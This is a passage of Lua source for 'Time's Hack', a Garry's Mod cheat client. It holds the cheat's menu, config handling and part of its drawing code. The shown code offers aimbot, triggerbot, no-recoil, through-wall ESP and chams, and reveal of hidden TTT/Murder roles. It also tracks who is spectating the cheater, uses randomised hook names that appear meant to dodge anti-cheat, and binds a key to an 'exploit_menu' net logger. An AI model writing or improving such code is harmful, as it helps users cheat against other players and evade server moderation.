		if v == cfg then
			loadedCfg[1] = k
		end
	end

	MsgC(Color(61, 149, 217), "\n[Time's Hack] ", Color(222, 222, 222), "Loaded Config - ", Color(255, 0, 0), cfg, "\n")

	CloseFrame()
	CreateTimeGUI()

end


function CreateConfig()

	if config["config_name"] == nil then return end
	
	if file.Exists("timeshack/"..config["config_name"]..".json", "DATA") then return end

	local JSONconfig = util.TableToJSON(config, true)
	file.CreateDir("timeshack")
	file.Write("timeshack/"..config["config_name"]..".json", JSONconfig)

	MsgC(Color(61, 149, 217), "\n[Time's Hack] ", Color(222, 222, 222), "Created Config - ", Color(255, 0, 0), config["config_name"], "\n")

	CloseFrame()
	CreateTimeGUI()

end


function DeleteConfig()

	if cfgDropdown:GetSelected() == nil then return end
	
	local cfg = cfgDropdown:GetSelected()
	file.Delete("timeshack/"..cfg)

	loadedCfg = {}

	MsgC(Color(61, 149, 217), "\n[Time's Hack] ", Color(222, 222, 222), "Deleted Config - ", Color(255, 0, 0), cfg, "\n")

	CloseFrame()
	CreateTimeGUI()

end

for k, v in ipairs(files) do
	if string.lower(v) == "default.json" then
		LoadDefault()
	end
end

function CheckObservers()

	if !config["misc_observerlist"] then return end

	observingPlayers = {}
	observingPlayers.watcher = {}
	observingPlayers.spec = {}

	for k, v in pairs(player.GetAll()) do
	    if v:IsValid() and v != LocalPlayer() then
	        local Trace = {}
	        Trace.start  = LocalPlayer():EyePos() + Vector(0, 0, 32)
	        Trace.endpos = v:EyePos() + Vector(0, 0, 32)
	        Trace.filter = {v, LocalPlayer()}
	        TraceRes = util.TraceLine(Trace)
	        if !TraceRes.Hit then
	            if (v:EyeAngles():Forward():Dot((LocalPlayer():EyePos() - v:EyePos())) > math.cos(math.rad(45))) then
	                if !table.HasValue(observingPlayers.watcher, v) then table.insert(observingPlayers.watcher, v ) end
	            end
	        end
	    end
	    if v:GetObserverTarget() == LocalPlayer() then
	    	if !table.HasValue(observingPlayers.spec, v) then table.insert(observingPlayers.spec, v) end
	    end
	end
end

timer.Create(RandomString(), 0.5, 0, CheckObservers)

--=================== Create GUI ================

function CreateTimeGUI()

	files, dir = file.Find( "timeshack/*.json", "DATA" )

	frame = vgui.Create("DFrame")
	frame:SetSize(320, 400)
	if frameX == nil or frameY == nil then
		frame:Center()
	else
		frame:SetPos(frameX, frameY)
	end
	frame:SetTitle("Time's Hack")
	frame:MakePopup()
	frame:ShowCloseButton(false)

	sheet = vgui.Create("DPropertySheet", frame)
	sheet:Dock(FILL)

	local aim = vgui.Create("DScrollPanel", sheet)
	local aimsbar = aim:GetVBar()
	function aimsbar:Paint(w, h)
		draw.RoundedBox(0, 0, 0, w, h, Color(0, 0, 0, 0))
	end
	function aimsbar.btnUp:Paint(w, h)
		draw.RoundedBox(0, 0, 0, w, h, Color(0, 0, 0, 0))
	end
	function aimsbar.btnDown:Paint(w, h)
		draw.RoundedBox(0, 0, 0, w, h, Color(0, 0, 0, 0))
	end
	function aimsbar.btnGrip:Paint(w, h)
		draw.RoundedBox(0, 0, 0, w, h, Color(0, 0, 0, 0))
	end
	sheet:AddSheet("Aimbot", aim, "icon16/bomb.png")

	local visplayer = vgui.Create("DScrollPanel", sheet)
	local playerbar = visplayer:GetVBar()
	function playerbar:Paint(w, h)
		draw.RoundedBox(0, 0, 0, w, h, Color(0, 0, 0, 0))
	end
	function playerbar.btnUp:Paint(w, h)
		draw.RoundedBox(0, 0, 0, w, h, Color(0, 0, 0, 0))
	end
	function playerbar.btnDown:Paint(w, h)
		draw.RoundedBox(0, 0, 0, w, h, Color(0, 0, 0, 0))
	end
	function playerbar.btnGrip:Paint(w, h)
		draw.RoundedBox(0, 0, 0, w, h, Color(0, 0, 0, 0))
	end
	sheet:AddSheet("Player", visplayer, "icon16/user.png")

	local visother = vgui.Create("DScrollPanel", sheet)
	local otherbar = visother:GetVBar()
	function otherbar:Paint(w, h)
		draw.RoundedBox(0, 0, 0, w, h, Color(0, 0, 0, 0))
	end
	function otherbar.btnUp:Paint(w, h)
		draw.RoundedBox(0, 0, 0, w, h, Color(0, 0, 0, 0))
	end
	function otherbar.btnDown:Paint(w, h)
		draw.RoundedBox(0, 0, 0, w, h, Color(0, 0, 0, 0))
	end
	function otherbar.btnGrip:Paint(w, h)
		draw.RoundedBox(0, 0, 0, w, h, Color(0, 0, 0, 0))
	end
	sheet:AddSheet("Other", visother, "icon16/world.png")

	local misc = vgui.Create("DScrollPanel", sheet)
	local miscbar = misc:GetVBar()
	function miscbar:Paint(w, h)
		draw.RoundedBox(0, 0, 0, w, h, Color(0, 0, 0, 0))
	end
	function miscbar.btnUp:Paint(w, h)
		draw.RoundedBox(0, 0, 0, w, h, Color(0, 0, 0, 0))
	end
	function miscbar.btnDown:Paint(w, h)
		draw.RoundedBox(0, 0, 0, w, h, Color(0, 0, 0, 0))
	end
	function miscbar.btnGrip:Paint(w, h)
		draw.RoundedBox(0, 0, 0, w, h, Color(0, 0, 0, 0))
	end
	sheet:AddSheet("Misc", misc, "icon16/cog.png")

	local config = vgui.Create("DScrollPanel", sheet)
	local configbar = config:GetVBar()
	function configbar:Paint(w, h)
		draw.RoundedBox(0, 0, 0, w, h, Color(0, 0, 0, 0))
	end
	function configbar.btnUp:Paint(w, h)
		draw.RoundedBox(0, 0, 0, w, h, Color(0, 0, 0, 0))
	end
	function configbar.btnDown:Paint(w, h)
		draw.RoundedBox(0, 0, 0, w, h, Color(0, 0, 0, 0))
	end
	function configbar.btnGrip:Paint(w, h)
		draw.RoundedBox(0, 0, 0, w, h, Color(0, 0, 0, 0))
	end
	sheet:AddSheet("Config", config, "icon16/database.png")
	sheet:SwitchToName(activeTab)
	for k, v in pairs(sheet:GetItems()) do
		function v.Tab:OnDepressed()
			activeTab = v.Name
		end
	end

	CreateCheckBox("Enable Aimbot", 10, 10, "aim_master_toggle", false, aim)
	CreateCheckBox("Aimbot On Key", 10, 30, "aim_onkey", false, aim)
	CreateKeybind(110, 30, "aim_onkey_key", aim)
	CreateCheckBox("No-Recoil", 10, 50, "aim_norecoil", false, aim)
	CreateCheckBox("Predict Velocity", 10, 70, "aim_prediction", false, aim)
	CreateDropdown("Target Selection", 10, 90, {"Crosshair", "Closest Distance", "Lowest Health"}, "aim_target", aim)
	CreateDropdown("Hitbox Selection", 10, 130, {"Hitscan", "Head", "Body"}, "aim_hitbox", aim)
	CreateSlider("Aimbot FOV", 10, 175, "aim_fov", 0, 180, 0, aim)
	CreateCheckBox("Aimbot Smoothing", 10, 220, "aim_smoothing", false, aim)
	CreateSlider("Smoothing Scale", 10, 240, "aim_smoothing_value", 0, 2, 2, aim)
	CreateCheckBox("Ignore Friends", 10, 280, "aim_ignorefriends", false, aim)

	CreateCheckBox("Enable Triggerbot", 10, 300, "trigger_master_toggle", false, aim)
	CreateCheckBox("Triggerbot On Key", 10, 320, "trigger_onkey", false, aim)
	CreateKeybind(130, 320, "trigger_onkey_key", aim)

	CreateCheckBox("Box ESP", 10, 10, "esp_player_box", true, visplayer)
	CreateCheckBox("Name ESP", 10, 30, "esp_player_name", true, visplayer)
	CreateCheckBox("HP ESP", 10, 50, "esp_player_hp", true, visplayer)
	CreateCheckBox("Armor ESP", 10, 70, "esp_player_armor", true, visplayer)
	CreateCheckBox("Weapon ESP", 10, 90, "esp_player_weapon", true, visplayer)
	CreateCheckBox("Rank ESP", 10, 110, "esp_player_rank", true, visplayer)
	CreateCheckBox("Team ESP", 10, 130, "esp_player_team", false, visplayer)
	CreateCheckBox("Skeleton ESP", 10, 150, "esp_player_skeleton", true, visplayer)
	CreateCheckBox("Snaplines", 10, 170, "esp_player_snaplines", true, visplayer)
	CreateCheckBox("Glow ESP", 10, 190, "esp_player_glow", true, visplayer)
	CreateCheckBox("Player Chams", 10, 210, "esp_player_chams", true, visplayer)
	CreateCheckBox("Player Chams XYZ", 10, 230, "esp_player_chams_xyz", true, visplayer)
	CreateDropdown("Chams Material", 10, 250, {"Textured", "Flat", "Wireframe"}, "esp_player_chams_material", visplayer)
	CreateSlider("ESP Max Render Distance", 10, 295, "esp_player_render_distance", 500, 10000, 0, visplayer)
	CreateCheckBox("Highlight Friends Box", 10, 335, "esp_player_highlight_box", true, visplayer)
	CreateCheckBox("Highlight Friends Name", 10, 355, "esp_player_highlight_name", true, visplayer)

	CreateCheckBox("Fog Modulation", 10, 10, "esp_other_fog", true, visother)
	CreateSlider("Fog Start", 10, 30, "esp_other_fog_start", 0, 50000, 0, visother)
	CreateSlider("Fog End", 10, 70, "esp_other_fog_end", 0, 50000, 0, visother)
	CreateSlider("Fog Density", 10, 110, "esp_other_fog_density", 0, 1, 1, visother)
	CreateCheckBox("Nightmode", 10, 150, "esp_other_nightmode", false, visother)
	CreateSlider("Nightmode Scale", 10, 170, "esp_other_nightmode_scale", 0, 1, 1, visother)
	CreateCheckBox("Hitsound", 10, 210, "esp_other_hitsound", false, visother)
	CreateCheckBox("Draw Aimbot FOV", 10, 230, "esp_other_drawfov", true, visother)
	CreateCheckBox("Fullbright", 10, 250, "esp_other_fullbright", false, visother)
	CreateCheckBox("Thirdperson", 10, 270, "esp_other_thirdperson", false, visother)
	CreateKeybind(100, 270, "thirdperson_key", visother)
	CreateSlider("Thirdperson Distance", 10, 290, "esp_other_thirdperson_distance", 5, 50, 0, visother) 

	CreateCheckBox("Auto Bunnyhop", 10, 10, "misc_autobunnyhop", false, misc)
	CreateCheckBox("Auto Strafe", 10, 30, "misc_autostrafe", false, misc)
	CreateCheckBox("Reveal TTT/MurderMystery Info", 10, 50, "misc_ttt", false, misc)
	CreateCheckBox("Observer List", 10, 70, "misc_observerlist", false, misc)
	CreateCheckBox("Rainbow Physgun", 10, 90, "misc_rainbow", false, misc)
	CreateSlider("Rainbow Speed", 10, 110, "misc_rainbow_speed", 1, 100, 0, misc)
	CreateCheckBox("Auto Click", 10, 150, "misc_autoclick", false, misc)
	CreateButton("Player List", "Open the player list menu.", CreatePlayerList, 10, 170, misc)
	CreateButton("Filter Teams", "The filter will be applied when the filter menu is closed. This filter applies to ESP and Aimbot.", CreateFilterPanel, 10, 195, misc)

	CreateLabel("Menu Keybind", 10, 10, config)
	CreateKeybind(10, 30, "menu_key", config)
	CreateLabel("Net Logger Keybind", 10, 50, config)
	CreateKeybind(10, 70, "logger_key", config)
	local usercfgs = {}
	cfgDropdown = vgui.Create("DComboBox", config)
	cfgDropdown:SetSize(200, 20)
	cfgDropdown:SetPos(10, 90)
	if loadedCfg[0] != nil then
		cfgDropdown:ChooseOption(loadedCfg[0], loadedCfg[1])
	end
	for k, v in ipairs(files) do
		cfgDropdown:AddChoice(v)
	end
	cfgDropdown:SetSortItems(false)

	CreateButton("Save Config", "Save Config.", SaveConfig, 10, 115, config)
	CreateButton("Load Config", "Load Config.", LoadConfig, 10, 140, config)
	CreateButton("Create Config", "Create Config.", CreateConfig, 10, 165, config)
	CreateButton("Delete Config", "Delete Config.", DeleteConfig, 10, 190, config)
	CreateTextInput("Config Name", "config_name", 10, 215, 16, config)

	if teamFilterWasOpen then
		CreateFilterPanel()
		teamFilterWasOpen = false
	end
	if pListWasOpen then
		CreatePlayerList()
		pListWasOpen = false
	end

end

--=================== GUI Item Functions ================

function CreateCheckBox(lbl, x, y, cfg, col, par)

	local checkBox = vgui.Create("DCheckBoxLabel", par)
	checkBox:SetText(lbl)
	checkBox:SetPos(x, y)
	checkBox:SetValue( config[cfg] )
	function checkBox:OnChange( bVal )
		config[cfg] = bVal
	end
	
	if col then

		local colorPicker = vgui.Create("DImageButton", par)
		colorPicker:SetImage("icon16/color_wheel.png")
		colorPicker:SetSize(16, 16)
		colorPicker:SetPos(checkBox:GetWide() + 15, y - 1)
		function colorPicker:DoClick()

			if IsValid(colorWindow) then
				colorWindow:Remove()
			end
			colorWindow = vgui.Create("DFrame")
			colorWindow:SetSize(300, 225)
			colorWindow:SetTitle(lbl.." - Color Picker")
			local frameX, frameY = frame:GetPos()
			if frameX + 350 > ScrW() then
				colorWindow:Center()
			else
				colorWindow:SetPos(frameX + 350, frameY)
			end
			colorWindow:MakePopup()

			local colorSelector = vgui.Create("DColorMixer", colorWindow)
			colorSelector:Dock(FILL)
			colorSelector:DockPadding(5, 5, 5, 5)
			colorSelector:SetPalette(false)
			colorSelector:SetColor(string.ToColor(config.colors[cfg]))
			function colorSelector:ValueChanged(val)

				local r = tostring(val.r)
				local g = tostring(val.g)
				local b = tostring(val.b)
				local a = tostring(val.a)
				local col = r.." "..g.." "..b.." "..a
				config.colors[cfg] = col
			end
		end
	end
end

function CreateLabel(lbl, x, y, par)

	local label = vgui.Create("DLabel", par)
	label:SetText(lbl)
	local w, h = label:GetTextSize()
	label:SetSize(w, h)
	label:SetPos(x, y)

end

function CreateSlider(lbl, x, y, cfg, min, max, dec, par)

	local sliderLabel = vgui.Create("DLabel", par)
	sliderLabel:SetText(lbl)
	local w, h = sliderLabel:GetTextSize()
	sliderLabel:SetWide(w)
	sliderLabel:SetPos(x, y - h / 8)

	local slider = vgui.Create("DNumSlider", par)
	slider:SetWide(490)
	slider:SetPos(x - 210, y + 10)
	slider:SetMin(min)
	slider:SetMax(max)
	slider:SetTooltip(lbl)
	slider:SetDefaultValue(config[cfg])
	slider:ResetToDefaultValue()
	slider:SetDecimals(dec)
	function slider:OnValueChanged()
		config[cfg] = slider:GetValue()
	end

end

function CreateDropdown(lbl, x, y, choices, cfg, par)

	local dropdownLabel = vgui.Create("DLabel", par)
	dropdownLabel:SetText(lbl)
	local w, h = dropdownLabel:GetTextSize()
	dropdownLabel:SetWide(w)
	dropdownLabel:SetPos(x, y - h / 8)

	local dropdown = vgui.Create("DComboBox", par)
	dropdown:SetSize(200, 20)
	dropdown:SetPos(x, y + 20)
	for k, v in ipairs(choices) do
		dropdown:AddChoice(v)
	end
	dropdown:SetSortItems(false)
	dropdown:ChooseOptionID(config[cfg])
	function dropdown:OnSelect(index, value, data)
		config[cfg] = index
	end
end

function CreateKeybind(x, y, cfg, par)

	local keyBind = vgui.Create("DButton", par)
	if config.keybinds[cfg] >= 107 && config.keybinds[cfg] <= 113 then
		keyBind:SetText(MouseBinds[config.keybinds[cfg]])
	else
		keyBind:SetText(KeyBinds[config.keybinds[cfg]])
	end
	keyBind:SetSize(80, 16)
	keyBind:SetPos(x, y)
	function keyBind:DoClick()
		keyBind:SetText("...")
		local ESCStuff, ESCNum = false, 0
		keyBind.Think = function()
			if !ESCStuff then
				for i = 107, 113 do
					if input.IsMouseDown(i) then
						config.keybinds[cfg] = i
						keyBind:SetText(MouseBinds[i])
						keyBind.Think = nil
					end
				end
				for i = 0, 159 do
					if input.IsKeyDown(i) then
						if i == 70 then
							gui.HideGameUI()
							config.keybinds[cfg] = 0
							keyBind:SetText(KeyBinds[0])
							keyBind.Think = nil
							ESCStuff = true
						else
							config.keybinds[cfg] = i
							keyBind:SetText(KeyBinds[i])
							keyBind.Think = nil
						end
					end
				end
			end
		end
	end
end

function CreateButton(lbl, tooltip, fnc, x, y, par)

	local button = vgui.Create("DButton", par)
	button:SetSize(150, 20)
	button:SetPos(x, y)
	button:SetText(lbl)
	button:SetTooltip(tooltip)
	function button:DoClick()
		fnc()
	end
end

function CreateTextInput(lbl, cfg, x, y, chars, par)

	textInput = vgui.Create("DTextEntry", par)
	textInput:SetSize(200, 20)
	textInput:SetPos(x, y)
	textInput:IsMultiline( false )
	textInput:SetMaximumCharCount(chars)
	textInput:SetPlaceholderText(lbl)
	textInput.Think = function()
		if textInput:IsEditing() then
			editingText	= true
		else
			editingText = false
		end
		config[cfg] = textInput:GetValue()
	end 
end

function CreateFilterPanel()

	if !teamFilter then

		teamFilter = vgui.Create("DFrame")
		teamFilter:SetSize(300, 200)
		teamFilter:SetTitle("Filter By Teams")
		if teamFilterX == nil or teamFilterY == nil then
			teamFilter:Center()
		else
			teamFilter:SetPos(teamFilterX, teamFilterY)
		end
		teamFilter:MakePopup()
		function teamFilter:OnClose()
			teamFilterX, teamFilterY = teamFilter:GetPos()
			teamFilter = false
			config["esp_player_filter"] = teamFilterEnable:GetChecked()
			for k, v in pairs(teamList:GetSelected()) do
				if !table.HasValue(teamFilterSelected, v:GetValue(1)) then
					table.insert(teamFilterSelected, v:GetValue(1))
				end
			end
		end

		teamFilterEnable = vgui.Create("DCheckBoxLabel", teamFilter)
		teamFilterEnable:Dock(TOP)
		teamFilterEnable:DockMargin(10, 10, 10, 0)
		teamFilterEnable:SetText("Enable Team Based Filtering")
		if config["esp_player_filtering"] then
			teamFilterEnable:SetValue( true )
		end
		function teamFilterEnable:OnChange(bval)
			config["esp_player_filtering"] = bval
		end

		teamList = vgui.Create("DListView", teamFilter)
		teamList:Dock(FILL)
		teamList:DockMargin(10, 10, 10, 10)
		teamList:SetMultiSelect(true)
		teamList:AddColumn("Teams")
		teamList:SetSortable(true)

		for k, v in pairs(team.GetAllTeams()) do
			if !( team.GetName(k) == team.GetName(TEAM_CONNECTING) ) && !( team.GetName(k) == team.GetName(TEAM_SPECTATOR) ) then
				teamList:AddLine(team.GetName(k))
			end
		end
		if !table.IsEmpty(teamFilterSelected) then
			for k, v in pairs(teamFilterSelected) do
				for i, line in ipairs(teamList:GetLines()) do
					if line:GetValue(1) == v then
						teamList:SelectItem(line)
						break
					end
				end
			end
		end
		teamFilterSelected = {}
	end
end

function CreatePlayerList()

	if !pList then

		pList = vgui.Create("DFrame")
		pList:SetSize(475, 200)
		local frameW, frameH = frame:GetPos()
		if frameW - 50 < 0 then
			pList:Center()
		else
			pList:SetPos(frameW - 525, frameH)
		end
		pList:SetTitle("Players List")
		pList:MakePopup()
		function pList:OnClose()
			pList = false
		end

		local dlist = vgui.Create("DListView", pList)
		dlist:DockMargin(0, 0, 150, 0)
		dlist:Dock(FILL)
		dlist:SetMultiSelect(false)
		dlist:AddColumn("Name")
		dlist:AddColumn("Steam ID")
		dlist:AddColumn("Rank")

		for k, v in ipairs(player.GetAll()) do
			if v != LocalPlayer() then
				dlist:AddLine(v:Name(), v:SteamID(), v:GetUserGroup())
			end
		end

		local profile = vgui.Create("DButton", pList)
		profile:SetSize(130, 20)
		profile:SetPos(335, 29)
		profile:SetText("Open Profile")
		profile:SetTooltip("Opens the selected players steam profile.")
		function profile:DoClick()
			if dlist:GetSelectedLine() != nil then
				local _, line = dlist:GetSelectedLine()
				player.GetBySteamID(line:GetColumnText(2)):ShowProfile()
			end
		end

		local steamid = vgui.Create("DButton", pList)
		steamid:SetSize(130, 20)
		steamid:SetPos(335, 54)
		steamid:SetText("Copy SteamID")
		steamid:SetTooltip("Copies the selected players SteamID.")
		function steamid:DoClick()
			if dlist:GetSelectedLine() != nil then
				local _, line = dlist:GetSelectedLine()
				SetClipboardText(line:GetColumnText(2))
				chat.AddText(Color(61, 149, 217), "[Time's Hack] ", Color(222, 222, 222), "SteamID copied to clipboard.")
			end
		end

		local friend = vgui.Create("DCheckBoxLabel", pList)
		friend:SetText("Friend")
		friend:SetPos(335, 79)
		friend:SetValue( false )
		function friend:OnChange( bVal )
			if dlist:GetSelectedLine() != nil then
				local _, line = dlist:GetSelectedLine()
				if bVal then
					if table.HasValue(config["friends"], line:GetColumnText(2)) then return
					else table.insert(config["friends"], line:GetColumnText(2)) end
				else
					if table.HasValue(config["friends"], line:GetColumnText(2)) then
						table.RemoveByValue(config["friends"], line:GetColumnText(2))
					end
				end
			end
		end

		function dlist:OnRowSelected(ind, line)
			if table.HasValue(config["friends"], line:GetColumnText(2)) then
				friend:SetValue(true)
			else
				friend:SetValue(false)
			end
		end
	end
end

-- ===================== GUI Logic

hook.Add("Think", RandomString(), function()
    if input.IsKeyDown(config.keybinds["menu_key"]) && !insertdown then
		if teamFilter then
			teamFilterX, teamFilterY = teamFilter:GetPos()
			config["esp_player_filter"] = teamFilterEnable:GetChecked()
			for k, v in pairs(teamList:GetSelected()) do
				if !table.HasValue(teamFilterSelected, v:GetValue(1)) then
					table.insert(teamFilterSelected, v:GetValue(1))
				end
			end
			teamFilter:Remove()
			teamFilterWasOpen = true
			teamFilter = false
		end
		if colorWindow then
			colorWindow:Remove()
			colorWindow = false
		end
		if pList then
			pList:Remove()
			pListWasOpen = true
			pList = false
		end
		if frame then
			CloseFrame()
		else
			CreateTimeGUI()
			RestoreCursorPosition()
		end
    end
    if (input.IsKeyDown(config.keybinds["logger_key"]) && !homedown) then
		if !exploit_menu:IsVisible() then
			gui.EnableScreenClicker(true)
			RestoreCursorPosition()
			exploit_menu:MakePopup()
			exploit_menu:SetVisible(true)
		else
			RememberCursorPosition()
			gui.EnableScreenClicker(false)
			exploit_menu:Hide()
			exploit_menu:SetVisible(false)
		end
	end
	insertdown = input.IsKeyDown(config.keybinds["menu_key"])
	homedown = input.IsKeyDown(config.keybinds["logger_key"])
end)

hook.Add("CreateMove", RandomString(), function( ucmd )
	if ( frame || exploit_menu:IsVisible() ) && not gui.IsConsoleVisible() && not gui.IsGameUIVisible() && not editingText then
		local ply = LocalPlayer()
		local f, b, l, r, j, d = input.GetKeyCode(input.LookupBinding("+forward")), input.GetKeyCode(input.LookupBinding("+back")), input.GetKeyCode(input.LookupBinding("+moveleft")), input.GetKeyCode(input.LookupBinding("+moveright")), input.GetKeyCode(input.LookupBinding("+jump")), input.GetKeyCode(input.LookupBinding("+duck"))
		if input.IsKeyDown( f ) then ucmd:SetForwardMove( ply:GetMaxSpeed() ) end
		if input.IsKeyDown( b ) then ucmd:SetForwardMove( -ply:GetMaxSpeed() ) end
		if input.IsKeyDown( r ) then ucmd:SetSideMove( ply:GetMaxSpeed() ) end
		if input.IsKeyDown( l ) then ucmd:SetSideMove( -ply:GetMaxSpeed() ) end
		if input.IsKeyDown( d ) then ucmd:SetButtons( IN_DUCK ) end
		if input.IsKeyDown( j ) then ucmd:SetButtons( IN_JUMP ) end
	end
end)

--===================================
--=================================== Visuals
--===================================

-- ======================= ESP

local bones = {
	{ S = "ValveBiped.Bip01_Head1", E = "ValveBiped.Bip01_Neck1" },
	{ S = "ValveBiped.Bip01_Neck1", E = "ValveBiped.Bip01_Spine4" },
	{ S = "ValveBiped.Bip01_Spine4", E = "ValveBiped.Bip01_Spine2" },
	{ S = "ValveBiped.Bip01_Spine2", E = "ValveBiped.Bip01_Spine1" },
	{ S = "ValveBiped.Bip01_Spine1", E = "ValveBiped.Bip01_Spine" },
	{ S = "ValveBiped.Bip01_Spine", E = "ValveBiped.Bip01_Pelvis" },
	{ S = "ValveBiped.Bip01_Spine2", E = "ValveBiped.Bip01_L_UpperArm" },
	{ S = "ValveBiped.Bip01_L_UpperArm", E = "ValveBiped.Bip01_L_Forearm" },
	{ S = "ValveBiped.Bip01_L_Forearm", E = "ValveBiped.Bip01_L_Hand" },
	{ S = "ValveBiped.Bip01_Spine2", E = "ValveBiped.Bip01_R_UpperArm" },
	{ S = "ValveBiped.Bip01_R_UpperArm", E = "ValveBiped.Bip01_R_Forearm" },
	{ S = "ValveBiped.Bip01_R_Forearm", E = "ValveBiped.Bip01_R_Hand" },
	{ S = "ValveBiped.Bip01_Pelvis", E = "ValveBiped.Bip01_L_Thigh" },
	{ S = "ValveBiped.Bip01_L_Thigh", E = "ValveBiped.Bip01_L_Calf" },
	{ S = "ValveBiped.Bip01_L_Calf", E = "ValveBiped.Bip01_L_Foot" },
	{ S = "ValveBiped.Bip01_L_Foot", E = "ValveBiped.Bip01_L_Toe0" },
	{ S = "ValveBiped.Bip01_Pelvis", E = "ValveBiped.Bip01_R_Thigh" },
	{ S = "ValveBiped.Bip01_R_Thigh", E = "ValveBiped.Bip01_R_Calf" },
	{ S = "ValveBiped.Bip01_R_Calf", E = "ValveBiped.Bip01_R_Foot" },
	{ S = "ValveBiped.Bip01_R_Foot", E = "ValveBiped.Bip01_R_Toe0" },
}

hook.Add("CheatHUDPaint", RandomString(), function()

	for k, v in ipairs(player.GetAll()) do
		if ValidateESP(v) then
			local MaxX, MaxY, MinX, MinY, V1, V2, V3, V4, V5, V6, V7, V8, isVis = GetENTPos( v )
			if isVis then
				if config["esp_player_box"] then
					if config["esp_player_highlight_box"] then
						if table.HasValue(config["friends"], v:SteamID()) then
							surface.SetDrawColor(string.ToColor(config.colors["esp_player_highlight_box"]))
						else
							surface.SetDrawColor(string.ToColor(config.colors["esp_player_box"]))
						end
					else
						surface.SetDrawColor(string.ToColor(config.colors["esp_player_box"]))
					end
					surface.DrawLine( MaxX, MaxY, MinX, MaxY )
					surface.DrawLine( MaxX, MaxY, MaxX, MinY )
					surface.DrawLine( MinX, MinY, MaxX, MinY )
					surface.DrawLine( MinX, MinY, MinX, MaxY )
				end
				if config["esp_player_name"] then
					surface.SetFont("ESP_Font_Main")
					local w, h = surface.GetTextSize(v:Nick())
					local col
					if config["esp_player_highlight_name"] then
						if table.HasValue(config["friends"], v:SteamID()) then
							col = string.ToColor(config.colors["esp_player_highlight_name"])
						else
							col = string.ToColor(config.colors["esp_player_name"])
						end
					else
						col = string.ToColor(config.colors["esp_player_name"])
					end
					draw.SimpleTextOutlined(v:Nick(), "ESP_Font_Main", MaxX-(MaxX-MinX)/2-w/2, MinY-1, col, TEXT_ALIGN_LEFT, TEXT_ALIGN_BOTTOM, 1, Color(0,0,0))
				end
				if config["esp_player_hp"] then
					local hpMultiplier = v:Health() / v:GetMaxHealth()
					hpMultiplier = math.Clamp(hpMultiplier, 0, 1)
					local barLen = MinY - MaxY
					barlen = barLen * hpMultiplier
					local appliedBar = (MinY - MaxY) - barlen
					surface.SetFont("ESP_Font_Flag")
					local w, h = surface.GetTextSize(v:Health())
					draw.SimpleTextOutlined(v:Health(), "ESP_Font_Flag", MinX-w-6, MinY+10, string.ToColor(config.colors["esp_player_hp"]), TEXT_ALIGN_LEFT, TEXT_ALIGN_BOTTOM, 1, Color(0,0,0))
					surface.SetDrawColor(0, 0, 0, 100)
					surface.DrawLine( MinX-2, MinY, MinX-2, MaxY )
					surface.DrawLine( MinX-3, MinY, MinX-3, MaxY )
					surface.SetDrawColor(0, 255, 0)
					surface.DrawLine( MinX-2, MinY-appliedBar, MinX-2, MaxY )
					surface.DrawLine( MinX-3, MinY-appliedBar, MinX-3, MaxY )
				end
				if config["esp_player_armor"] then
					local yOffset
					if config["esp_player_hp"] then
						yOffset = 20
					else
						yOffset = 10
					end
					surface.SetFont("ESP_Font_Flag")
					local w, h = surface.GetTextSize(v:Armor())
					if v:Armor() != 0 then
						draw.SimpleTextOutlined(v:Armor(), "ESP_Font_Flag", MinX-w-6, MinY+yOffset, string.ToColor(config.colors["esp_player_armor"]), TEXT_ALIGN_LEFT, TEXT_ALIGN_BOTTOM, 1, Color(0,0,0))
					end
				end
				if config["esp_player_weapon"] then
					surface.SetFont("ESP_Font_Flag")
					if IsValid(v:GetActiveWeapon()) then
						local w, h = surface.GetTextSize(v:GetActiveWeapon():GetClass())
						draw.SimpleTextOutlined(v:GetActiveWeapon():GetClass(), "ESP_Font_Flag", MaxX-(MaxX-MinX)/2-w/2, MaxY+12, string.ToColor(config.colors["esp_player_weapon"]), TEXT_ALIGN_LEFT, TEXT_ALIGN_BOTTOM, 1, Color(0,0,0))
					end
				end
				if config["esp_player_rank"] then
					local yOffset
					if config["esp_player_weapon"] then
						yOffset = 24
					else
						yOffset = 12
					end
					surface.SetFont("ESP_Font_Flag")
					local w, h = surface.GetTextSize(v:GetUserGroup())
					draw.SimpleTextOutlined(v:GetUserGroup(), "ESP_Font_Flag", MaxX-(MaxX-MinX)/2-w/2, MaxY+yOffset, string.ToColor(config.colors["esp_player_rank"]), TEXT_ALIGN_LEFT, TEXT_ALIGN_BOTTOM, 1, Color(0,0,0))
				end
				if config["esp_player_team"] then
					local yOffset
					if config["esp_player_weapon"] && config["esp_player_rank"] then
						yOffset = 36
					elseif ( config["esp_player_weapon"] && !config["esp_player_rank"] ) || ( !config["esp_player_weapon"] && config["esp_player_rank"] ) then
						yOffset = 24
					else
						yOffset = 12
					end
					local teamColor = team.GetColor(v:Team())
					surface.SetFont("ESP_Font_Flag")
					local w, h = surface.GetTextSize(team.GetName(v:Team()))
					draw.SimpleTextOutlined(team.GetName(v:Team()), "ESP_Font_Flag", MaxX-(MaxX-MinX)/2-w/2, MaxY+yOffset, teamColor, TEXT_ALIGN_LEFT, TEXT_ALIGN_BOTTOM, 1, Color(0,0,0))
				end
				if config["esp_player_snaplines"] then
					surface.SetDrawColor( string.ToColor(config.colors["esp_player_snaplines"]))
					surface.DrawLine( ScrW() / 2 - 1, ScrH() , MaxX - ( MaxX - MinX ) / 2 - 1, MaxY )
				end
				if config["esp_player_skeleton"] then
					for _, b in pairs( bones ) do
						if v:LookupBone(b.S) != nil && v:LookupBone(b.E) != nil then
							local spos, epos = v:GetBonePosition(v:LookupBone(b.S)):ToScreen(), v:GetBonePosition(v:LookupBone(b.E)):ToScreen()
							if spos.visible && epos.visible then
								surface.SetDrawColor( string.ToColor(config.colors["esp_player_skeleton"]) )
								surface.DrawLine( spos.x, spos.y, epos.x, epos.y )
							end
						end
					end
				end
				if config["misc_observerlist"] then
					for k, v in ipairs(observingPlayers.watcher) do
						if !IsValid(v) then return end
						surface.SetFont("ESP_Font_Main")
						local nameWidth, nameHeight = surface.GetTextSize("Observer: "..v:Name())
						draw.SimpleText("Observer: "..v:Name(), "ESP_Font_Main", ScrW() - nameWidth - 2, 0 + (15 * ( k - 1 ) ), Color(255, 255, 255), TEXT_ALIGN_LEFT, TEXT_ALIGN_TOP)
					end
					for k, v in ipairs(observingPlayers.spec) do
						if !IsValid(v) then return end
						surface.SetFont("ESP_Font_Main")
						local nameWidth, nameHeight = surface.GetTextSize("Spectator: "..v:Name())
